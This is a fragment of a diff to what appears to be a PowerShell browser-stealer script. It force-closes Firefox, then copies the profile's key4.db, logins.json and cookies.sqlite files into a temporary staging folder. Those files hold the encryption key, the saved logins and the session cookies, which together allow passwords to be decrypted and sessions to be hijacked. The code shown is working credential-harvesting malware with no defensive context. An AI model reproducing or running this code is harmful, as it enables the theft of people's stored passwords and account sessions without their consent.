 taskkill /IM firefox.exe /F
 Start-Sleep 1
-New-Item -Path $env:tmp/$FolderName/Firefox -ItemType Directory
+New-Item -Path $env:tmp/$FolderName/Browsers/Firefox -ItemType Directory
 Get-Content $key4 > $env:TMP\$FolderName\Browsers\Firefox\key4.db
 Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include logins.json -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Browsers\Firefox\logins.json
 Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include cookies.sqlite -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Browsers\Firefox\cookies.sqlite
